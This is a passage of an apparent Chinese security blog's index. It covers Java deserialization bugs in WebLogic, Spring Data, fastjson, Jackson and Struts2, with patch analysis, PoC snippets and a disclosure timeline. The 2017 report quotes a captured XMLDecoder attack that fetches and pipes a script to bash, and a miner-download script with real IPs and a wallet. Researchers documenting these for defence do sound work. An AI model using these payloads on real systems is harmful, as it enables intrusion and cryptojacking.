原生反序列化防御• 不要反序列化不可信的数据• 给反序列数据加密签名，并确保解密在反序列之前• 给反序列化接口添加认证授权• 反序列化服务只允许监听在本地或者开启相应防火墙• 升级第三方库• 升级JDK，JEP290 6 招人绿盟科技Web攻防实验室欢迎各位应聘，招聘大牛和实习生。团队专注于最前沿的Web攻防研究，大数据分析，前瞻性攻击与检测预研.联系邮箱： liaoxinxi[@]nsfocus.com 或者liwenjin[@]nsfocus.com pdf:]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>Weblogic</tag>
        <tag>java</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-2628 简单复现与分析]]></title>
    <url>%2F2018%2F06%2F20%2FCVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1，概述当地时间4月17日，北京时间4月18日凌晨，Oracle官方发布了4月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic反序列化漏洞(CVE-2018-2628)，这个漏洞是我在去年11月份报给Oracle的，通过该漏洞，攻击者可以在未授权的情况下远程执行任意代码。 参考链接： http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html 漏洞影响范围Weblogic 10.3.6.0 Weblogic 12.1.3.0 Weblogic 12.2.1.2 Weblogic 12.2.1.3 2，复现第一步发送测试PoC，PoC中远程连接的服务器地址就是第二步中所使用的服务器，攻击的ip是192.168.3.103的7001端口上的T3服务，该服务会解包Object结构，通过一步步的readObject去第二步服务器上的1099端口请求恶意封装的代码，然后在本地弹出计算器。 第二步在远程服务器上启用ysoserial.exploit.JRMPListener，JRMPListener会将含有恶意代码的payload发送回请求方。 查看weblogic的日志，可以看到如下错误，此时已经弹出计算器： 3，分析Weblogic已经将互联网暴露的PoC都已经加入了黑名单，如果要绕过他的黑名单的限制就只能自己动手构造。来看看InboundMsgAbbrev中resolveProxyClass的实现，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，其实随便找一个rmi接口即可绕过。 12345678910111213protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123; String[] arr$ = interfaces; int len$ = interfaces.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; String intf = arr$[i$]; if(intf.equals("java.rmi.registry.Registry")) &#123; throw new InvalidObjectException("Unauthorized proxy deserialization"); &#125; &#125; return super.resolveProxyClass(interfaces);&#125; 其实核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。大致的调用栈如下：readObject:66, InboundMsgAbbrev (weblogic.rjvm), InboundMsgAbbrev.java-》readExternalData:1810, ObjectInputStream (java.io), ObjectInputStream.java—》readExternal:1433, StreamMessageImpl (weblogic.jms.common), StreamMessageImpl.java—–》readObject:455, RemoteObject (java.rmi.server), RemoteObject.java 披露时间线：2017/7/19：发现问题2017/11/23：报告给Oracle官方2017/11/29：Oracle官方接收2017/11/30：Oracle官方分配bug号(S0947640)，正式进入主线版本修复2017/11/30：索要公司域名邮箱2018/4/14：分配CVE，CVE-2018-26282018/4/17：发布补丁]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>CVE-2018-2628</tag>
        <tag>Weblogic</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-1273 RCE with Spring Data Commons 分析报告]]></title>
    <url>%2F2018%2F04%2F12%2FCVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%2F</url>
    <content type="text"><![CDATA[1，漏洞公告：链接：https://pivotal.io/security/cve-2018-1273Severity：CriticalVendor：Spring by Pivotal DescriptionSpring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data’s projection-based request payload binding hat can lead to a remote code execution attack. Affected Pivotal Products and Versions Severity is critical unless otherwise noted. Spring Data Commons 1.13 to 1.13.10 (Ingalls SR10) Spring Data REST 2.6 to 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 to 3.0.5 (Kay SR5) Older unsupported versions are also affected MitigationUsers of affected versions should apply the following mitigation: 2.0.x users should upgrade to 2.0.6 1.13.x users should upgrade to 1.13.11 Older versions should upgrade to a supported branch Releases that have fixed this issue include: Spring Data REST 2.6.11 (Ingalls SR11) Spring Data REST 3.0.6 (Kay SR6) Spring Boot 1.5.11 Spring Boot 2.0.1 There are no other mitigation steps necessary. Note that the use of authentication and authorization for endpoints, both of which are provided by Spring Security, limits exposure to this vulnerability to authorized users. CreditThis issue was identified and responsibly reported by Philippe Arteau, GoSecure Inc. References https://jira.spring.io/browse/DATACMNS-1282 https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653 https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#core.web.binding 2，补丁分析：补丁的内容：DATACMNS-1282 - Switched to SimpleEvaluationContext in MapDataBinder.很明显这是一个spel表达式注入漏洞。补丁的内容如下：补丁大致就是将StandardEvaluationContext替代为SimpleEvaluationContext，由于StandardEvaluationContext权限过大，可以执行任意代码，会被恶意用户利用。SimpleEvaluationContext的权限则小的多，只支持一些map结构，通用的jang.lang.Runtime,java.lang.ProcessBuilder都已经不再支持，详情可查看SimpleEvaluationContext的实现。 3，PoC构造：PoC的构造实在可以说路途忐忑，首先官方的描述信息带有一点误导的作用，当然也有可能是我水平不够，没有找到利用点。Spring官方说一个恶意攻击者可以构造任意参数来攻击Spring Data REST支持的http资源或者Spring Data’s projection的请求绑定来达到远程攻击的目的。再加上官方给的链接，直接就盯上了projection这个项目。特别是里面提到的json自动绑定技术。仔细阅读官方资料，发送payload调试，加断点，没有一点反响，肯定是漏洞没触发呗。简单粗暴的方式行不通，只能一个节点一个节点的分析调试。 首先拉取项目https://github.com/spring-projects/spring-data-examples/ ，修改pom.xml中parent节点为12345&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.0.RC1&lt;/version&gt;&lt;/parent&gt; 为什么要降到这个版本，是因为spring-data-commons在2.0.5版本就拒绝了SpEl表达式，添加了如下代码：123context.setTypeLocator(typeName -&gt; &#123; throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);&#125;) 初步研究了下，我也绕不过，就只能再降低个版本了。详细release说明见：https://github.com/spring-projects/spring-data-commons/blob/d8a1c2cfde78e87cd4bae3bfcc9782750a783b0b/src/main/resources/changelog.txt 导入到IDEA里，打开项目web[spring-data-web-example]中的UserController.java123456789101112131415161718192021222324252627282930@Controller@RequiredArgsConstructor@RequestMapping("/users")class UserController &#123; private final UserManagement userManagement; /** * Registers a new &#123;@link User&#125; for the data provided by the given &#123;@link UserForm&#125;. Note, how an interface is used to * bind request parameters. * * @param userForm the request data bound to the &#123;@link UserForm&#125; instance. * @param binding the result of the binding operation. * @param model the Spring MVC &#123;@link Model&#125;. * @return */ @RequestMapping(method = RequestMethod.POST) public Object register(UserForm userForm, BindingResult binding, Model model) &#123; userForm.validate(binding, userManagement); if (binding.hasErrors()) &#123; return "users"; &#125; userManagement.register(new Username(userForm.getUsername()), Password.raw(userForm.getPassword())); RedirectView redirectView = new RedirectView("redirect:/users"); redirectView.setPropagateQueryParams(true); return redirectView; &#125; 注意到如下代码：@RequestMapping(method = RequestMethod.POST) public Object register(UserForm userForm, BindingResult binding, Model model)这其中就有UserForm，BindingResult, Model，为啥会是从这个接口进入呢？还是要从问题点出发，也就是MapDataBinder的实现。存在问题的代码是MapDataBinder.setPropertyValue,但是怎么被调用起来的还是挺复杂，慢慢可以看出是ProxyingHandlerMethodArgumentResolver使用了MapDataBinder的接口，实现大体如下：12345678910public class ProxyingHandlerMethodArgumentResolver extends ModelAttributeMethodProcessor implements BeanFactoryAware, BeanClassLoaderAware &#123;protected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception &#123; MapDataBinder binder = new MapDataBinder(parameter.getParameterType(), conversionService.getObject()); binder.bind(new MutablePropertyValues(request.getParameterMap())); return proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());&#125; 这块又是怎么调用起来的，只能找官方文档了，找到了这么一处，http://ju.outofmemory.cn/entry/125029从 这里可以看出一些端倪，123456789101112interface Form &#123; @NotBlank String getName(); @NotBlank String getText();&#125;@Controller@RequestMapping(value = "/guestbook")class GuestbookController &#123; @RequestMapping(method = RequestMethod.GET) String guestbook(Form form, Model model) &#123; … &#125; @RequestMapping(method = RequestMethod.POST) String guestbook(@Valid Form form, Errors errors, Model model) &#123; … &#125;&#125; 在处理类似代码的时候会用到ProxyingHandlerMethodArgumentResolver，总算上了半点道，这里Form，有Model，对Spring 真是不熟悉，特别是各种各样的注解，看着也头疼，而且不好调试，只能偷懒了，找官方项目，于是找到了web[spring-data-web-example]，其实这个早已经在看了，只是前面看了点又放弃了，还好，PoC一发立马弹出计算器。当然这个PoC已经单步调试过，单步调试的坑也是非常多，比如说找可写权限的属性等这里暂且先不说了。只是这次这次直接从web请求触发。具体的栈图如下：最后给大家放个图，以证明漏洞有效，计算器图：其实username，password，repeatedPassword字段都可以添加漏洞利用代码。还有一点就是[]是嵌套属性的写法，在[]中间可以写入表达式，先找到username，这个也是跟这个表单属性绑定的，具体的代码如下：1234interface UserForm &#123; String getUsername(); String getPassword(); String getRepeatedPassword();]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring</tag>
        <tag>表达式注入</tag>
        <tag>RCE</tag>
        <tag>分析</tag>
        <tag>利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017年反序列化漏洞年度报告]]></title>
    <url>%2F2018%2F01%2F25%2F2017%E5%B9%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A%2F</url>
    <content type="text"><![CDATA[2017年反序列化漏洞年度报告Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告 背景2017年OWASP发布了新的十大web漏洞威胁，其中A8:2017就是不安全的反序列化，A9:2017-使用含有已知漏洞的组件也和反序列化紧密相连，这是因为在Java开发中很多代码都依赖于第三方组件，而这些组件可能会存在反序列漏洞，典型的例子就是Jackson，fastjson，XStream，XMLDecoder等开源组件。绿盟科技NS-SRC 处理的漏洞应急中就有很大一部分是反序列化漏洞，下面我们来一一分析2017年我们应急的那些反序列化漏洞。总得来说，2017年出现的反序列化漏洞和以往反序列漏洞在漏洞形成方式上不太一样，在以往都是由于Java自身的反序列特征导致的漏洞，2017年则多了fastjson，Jackson等，这两个库都能将json文本转换成具体的java bean，在这个转换过程中会导致远程代码执行。本报告重点回顾2017年绿盟科技重点应急，影响面非常广的那些反序列化漏洞。从这个报告中能看出反序列化漏洞的发展，攻击方和防御方不停的对抗过程，bypass和反bypass在这个过程中体现得淋漓尽致。 概述 从3月份爆出Fastjson的反序列化特性导致的远程代码执行，四月份则是Jackson，Log4j2，Jenkins的反序列化造成的远程代码执行，接着6月份流出了Weblogic CVE-2017-3248的利用代码。稍微消停了一会，Struts2又被安全研究人员盯上，爆出Struts2-052，又是一个远程代码执行。在11月份，由于Jackson官方对漏洞不敏感，接着又被曝CVE-2017-15095，又一个绕过。进入12月份，Fastjson和Jackson相继发布了几个补丁修复那些黑名单的绕过；Weblogic XMLDecoder(CVE-2017-10352)的漏洞被广泛应用于于挖坑。由于很多漏洞都是远程代码执行，有的一个HTTP POST请求就能getshell，所以备受黑产亲睐。 反序列化漏洞1 fastjson反序列化漏洞2017年3月15日，fastjson官方发布安全公告表示fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。fastjson官方建议直接升级到1.2.28/1.2.29或者更新版本来保证系统安全。4月29日，本文作者（xxlegend）构造出了Fastjson的反序列漏洞的PoC，引起了安全圈的广泛讨论。详细的分析可参照1，下面做简单的回顾。 1.1 补丁在ParserConfig.java中添加了checkAutoType，不论用户是否开启了autoTypeSupport功能，在类名被加载时都需要通过额外的一层处理（来判断是否在acceptlist里），只有满足了此限制的类名才会被加载。另外引入了黑名单机制，在开启了autoTypeSupport的情况下，如果加载的是黑名单中类也会抛出异常。补丁核心代码如下：1234567891011121314151617181920212223242526272829303132public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; if (typeName.length() &gt;= maxTypeNameLength) &#123; throw new JSONException("autoType is not support. " + typeName); &#125; final String className = typeName.replace('$', '.'); if (autoTypeSupport || expectClass != null) &#123; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException("autoType is not support. " + typeName); &#125; &#125; &#125; Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125; if (clazz != null) &#123; if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException("type not match. " + typeName + " -&gt; " + expectClass.getName()); &#125; return clazz; &#125; 1.2 初略分析静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。这里我们就引入com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类。1234567final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"; String text1 = "&#123;\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;," + "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); 最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。整个PoC的执行过程的调用栈如下:1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 更多的原理分析可见2 。 1.3 后续官方修补fastjson官方后续又添加了一些补丁，本文作者给fastjson官方提交了两次绕过，fastjson官方都发布了相应更新。具体如下： fastjson-1.2.34版本发布，当autoType=true时增强安全防护 fastjson-1.2.42版本发布 Bug修复安全加固 fastjson-1.2.43版本发布 Bug修复安全加固 fastjson-1.2.44版本发布 Bug修复安全加固 在fastjson-1.2.42版本中通过异或操作混淆了其黑名单，可以阻挡一部分人分析其黑名单内容，其实这是自欺欺人的。具体的黑名单分析读者可以自行研究。 2 Jackson反序列化Jackson是一个开源的Java序列化与反序列化工具，可以将java对象序列化为xml或json格式的字符串，或者反序列化回对应的对象，由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。但是其组件Jackson-databind可以指定特定的反序列化类，这样就存在代码执行的风险。 2.1 CVE-2017-7525这个CVE是本文作者报告的。下面来看一个Jackson官方的补丁，这个补丁主要是将TemplatesImpl加入了黑名单，从后续的CVE就可以看出这是远远不够的，可以通过各种方式绕过。123456789101112131415161718+ protected void checkIllegalTypes(DeserializationContext ctxt, JavaType type,+ BeanDescription beanDesc)+ throws JsonMappingException+ &#123;+ // There are certain nasty classes that could cause problems, mostly+ // via default typing -- catch them here.+ Class&lt;?&gt; raw = type.getRawClass();+ String name = raw.getSimpleName();++ if ("TemplatesImpl".equals(name)) &#123; // [databind#1599]+ if (raw.getName().startsWith("com.sun.org.apache.xalan")) &#123;+ throw JsonMappingException.from(ctxt,+ String.format("Illegal type (%s) to deserialize: prevented for security reasons",+ name));+ &#125;+ &#125;+ &#125; &#125; 2.1.1 分析Jackson在反序列的过程中，首先扫描输入的json文件，分析其要反序列的类，通过反射的方式获取该类的构造方法，包括无参构造方法和有参构造方法，获取其setter，getter方法用于操作具体的类的属性。反序列的过程就是先通过反射得到一个实例，通过其setter或者getter方法给该实例的属性赋值，当然如果引入的类的setter方法或者getter方法中存在执行一些一些危险的操作，如利用rmi远程加载类则会造成远程代码执行缺陷。PoC示例图详细分析可参考3。 后续官方修补CVE-2017-15095是CVE-2017-7525的延续，这个漏洞同样也是本文作者报告的。同样是黑名单的绕过。CVE-2017-17485是CVE-2017-7525的延续，这个漏洞引入的类是org.springframework.context.support.ClassPathXmlApplicationContext,利用这个库的bean重新生成类，而这个bean所依赖的xml是由攻击者来定制的。从这里也可以看出黑名单就是个无底洞，深不可见，bypass也是不完。由于Jackson的特性，可以预测，Jackson在2018年还将出现更多的绕过。 3 Struts2struts2号称漏洞之王，2017应急中就处理了S2-045，S2-046，S2-48，S2-052，S2-055，都是远程代码执行级别的漏洞。S2-045的PoC现在还被黑客用于各种漏洞扫描，挖矿。既然是漏洞之王，那自然少不了反序列化，S2-052（CVE-2017-9805）就是XStream使用不当造成的反序列化。S2-055则是由于Jackson-databind导致的反序列化。这两个漏洞的典型特点都是不恰当的使用第三方库导致的。 3.1 S2-052分析根据官方的描述信息来看，是REST插件使用到XStreamHandler处理xml数据的时候，由于未对xml数据做任何过滤，在进行反序列将xml数据转换成Object时导致的RCE。 3.1.1 补丁补丁的核心部分如下：1234567891011+ protected void addDefaultPermissions(ActionInvocation invocation, XStream stream) &#123; + stream.addPermission(new ExplicitTypePermission(new Class[]&#123;invocation.getAction().getClass()&#125;)); + if (invocation.getAction() instanceof ModelDriven) &#123; + stream.addPermission(new ExplicitTypePermission(new Class[]&#123;((ModelDriven) invocation.getAction()).getModel().getClass()&#125;)); + &#125; + stream.addPermission(NullPermission.NULL); + stream.addPermission(PrimitiveTypePermission.PRIMITIVES); + stream.addPermission(ArrayTypePermission.ARRAYS); + stream.addPermission(CollectionTypePermission.COLLECTIONS); + stream.addPermission(new ExplicitTypePermission(new Class[]&#123;Date.class&#125;)); + &#125; 主要就是将xml中的数据白名单化，把Collection和Map，一些基础类，时间类放在白名单中，这样就能阻止XStream反序列化的过程中带入一些有害类。 3.1.2 分析首先分析入口文件，在Struts2的配置文件中有如下xml描述信息： 12&lt;bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="xml" class="org.apache.struts2.rest.handler.XStreamHandler"/&gt;&lt;constant name="struts.action.extension" value="xhtml,,xml,json"/&gt; 也就是说ContentType为xml的所有请求都会交给XStreamHandler来处理，XStreamHanler.toObject调用了XStream.fromXml来处理那些请求中的xml信息，从而进入反序列化流程。这里面最有意思的应该是官方给的临时缓解措施不起作用，官方给出的缓解措施&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,,,json&quot; /&gt;，从字面意思也能看出来，这个是针对action的后缀的，也就是说如果后缀不带xml也就可以绕过。而POST请求一般不带xml后缀直接忽视这个缓解措施。下图就是一个示例：所以说Struts的官方也是根据PoC修漏洞，没完全测试过的东西就直接放出来。XStream只跟Content-Type有关，如果Content-Type中含有xml，则会交给XStream处理，更多的详情分析见4 3.2 S2-055分析2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。 S2-055补丁没有提供补丁，只是提醒升级Jackson库版本。 S2-055分析为了让Jackson支持多态，Jackson官方提供了几种方式，第一种全局Default Typing机制，第二种为相应的class添加@JsonTypeInfo注解。这里会启用第二种方式，在第二种方式中，大体代码如下：12@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY) public Object clientName; 在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。另外Jackson不是默认句柄，需要设置ContentTypeHandler，这样当Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理。具体的PoC就是Jackson的PoC，这里不再展示，详情分析见5。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。 4 Weblogic在2017年，整个Oracle的产品线都深受反序列化影响，其中Weblogic影响面尤其广泛，很多漏洞的CVSS评分都是9.8，9.9甚至为10。而且CVE-2017-3248的PoC已经在github上，并且被用于黑产，CVE-2017-10352 PoC也被泄露同样被用于黑产。 ###4.1 CVE-2017-3248 分析 这个漏洞(CVE-2017-3248)就是利用rmi机制的缺陷，通过JRMP协议达到执行任意反序列化payload的目的。利用步骤可以分为两步，第一步建立JRMP监听端口，第二步执行反序列化操作，其反序列化内容指向外部的JRMP监听端口，这样在反序列的过程中就会从远程JRMP监听端口加载内容并执行序列化操作，详细的利用工具可以使用ysoserial。 ###4.2 CVE-2017-10352 分析 这个漏洞是由于XMLDecoder这个缺陷库存在代码执行问题，同样也是由于被黑产利用而被大家广泛得知。其实在CVE-2017-3506中，Weblogic官方已经做了一次修补，只是当时的修补不够彻底，后来有研究员给Weblogic提供了绕过的PoC，Weblogic官方再次完整修补。同时这个PoC也被泄露，非常多的用户中招。 4.2.1 补丁补丁的核心代码如下：1234567891011121314151617181920212223242526private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid element qName:object"); &#125; else if(qName.equalsIgnoreCase("new")) &#123; throw new IllegalStateException("Invalid element qName:new"); &#125; else if(qName.equalsIgnoreCase("method")) &#123; throw new IllegalStateException("Invalid element qName:method"); &#125; else &#123; if(qName.equalsIgnoreCase("void")) &#123; for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) &#123; if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) &#123; throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass)); &#125; &#125; &#125; if(qName.equalsIgnoreCase("array")) &#123; String var9 = attributes.getValue("class"); if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) &#123; throw new IllegalStateException("The value of class attribute is not valid for array element."); &#125; 这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。 4.2.2 分析根据补丁大概就得就能猜出相应的PoC，具体如下：123456789101112131415161718192021222324POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.216:7001Accept-Encoding: identityContent-Length: 683Accept-Language: zh-CN,zh;q=0.8Accept: */*User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0Content-Type: text/xml&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; 。。。。 &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 在动态调试过程中这个调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法，也就是请求中soapenv:Header包裹的部分，这一部分最终会交给XMLDecoder，XMLDecoder完成数据到对象的转换，即会执行恶意代码。并且wls-wsat是一个特权应用，无需用户名密码验证，所以危害非常大。更多详情分析可参考文档 6 , 同时绿盟科技这篇报告的英文版还被Java-Deserialization-Cheat-Sheet收录。 4.2.3 黑产利用在绿盟的IPS设备或者蜜罐设备就能看到很多这种利用Weblogic XMLDecoder（CVE-2017-10352）进行黑产利用的特征，下面是绿盟IPS抓到的示例，具体如下：123srcip为173.212.217.181POST /wls-wsat/CoordinatorPortType HTTP/1.1////0d////0aHost: 58.210.×.×:8001////0d////0aAccept-Encoding: identity////0d////0aContent-Length: 983////0d////0aAccept-Language: zh-CN,zh;q=0.8////0d////0aAccept: */*////0d////0aUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0////0d////0aAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3////0d////0aConnection: keep-alive////0d////0aReferer: http://www.baidu.com////0d////0aCache-Control: max-age=0////0d////0aContent-Type: text/xml////0d////0a////0d////0a&lt;soapenv:Envelope xmlns:soapenv= http://schemas.xmlsoap.org/soap/envelope/ &gt;////0a &lt;soapenv:Header&gt;////0a &lt;work:WorkContext xmlns:work= http://bea.com/2004/06/soap/workarea/ &gt;////0a &lt;java version= 1.8.0_131 class= java.beans.XMLDecoder &gt;////0a &lt;void class= java.lang.ProcessBuilder &gt;////0a &lt;array class= java.lang.String length= 3 &gt;////0a &lt;void index= 0 &gt;////0a &lt;string&gt;/bin/bash&lt;/string&gt;////0a &lt;/void&gt;////0a &lt;void index= 1 &gt;////0a &lt;string&gt;-c&lt;/string&gt;////0a &lt;/void&gt;////0a &lt;void index= 2 &gt;////0a &lt;string&gt;wget -O - 191.101.180.74/robots.txt|bash&lt;/string&gt;////0a &lt;/void&gt;////0a &lt;/array&gt;////0a &lt;void method= start /&gt;&lt;/void&gt;////0a &lt;/java&gt;////0a &lt;/work:WorkContext&gt;////0a &lt;/soapenv:Header&gt;////0a &lt;soapenv:Body/&gt;////0a &lt;/soapenv:Envelope&gt; 对于linux系统会去191.101.180.74下载一个bash脚本执行挖坑行为（门罗币）。这个robots.txt的核心内容如下：123456789wget -q http://45.123.190.178/Silence -O /tmp/Silencecurl -o /tmp/Silence http://45.123.190.178/Silenceelseexit 0;fichmod +x /tmp/Silencenohup /tmp/Silence -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;sleep 10rm -rf /tmp/Silence 对srcip：173.212.217.181溯源跟踪，从绿盟科技威胁情报中心NTI中的数据也能看出，该IP从2017年8月份开始，一直被用于特定漏洞扫描以便发现更多具有脆弱性的主机。 #总结从OWASP 2017 top ten报告中可以看出反序列化是一个业内都开始关注重视的漏洞类型，一个原因就是该漏洞很多时候都是通过黑名单的方式的修复，这就导致了层出不穷的绕过，从Jackson，fastjson，weblogic一见端倪，都是修复，绕过，再修复，再绕过，没有尽头。另外一个原因就是该漏洞的危害非常大，通常都是RCE，一个PoC直接获取系统权限，不管是黑产，灰产，开发，运维还有白帽安全人员都非常重视该类型的漏洞。从系统的重要性来看，国内很多商业系统都是基于Java框架开发，这些中间件或者Web容器一旦出现漏洞，整个系统都变得不堪一击，可能造成不可挽回的影响。对于反序列漏洞的防御，业内也是一个难题，首先得确保所有的依赖库和容器已经更新到最新版本，这样能防止已知漏洞的攻击。另外绿盟科技的IPS，WAF都已经具备对这些漏洞的防护能力，更多的防护策略请参考绿盟科技下一篇关于反序列化漏洞防御的文档。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Struts2</tag>
        <tag>XStream</tag>
        <tag>XMLDecoder</tag>
        <tag>fastjson</tag>
        <tag>Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告</tag>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic XMLDecoder RCE分析]]></title>
    <url>%2F2017%2F12%2F23%2FWeblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90%2F</url>
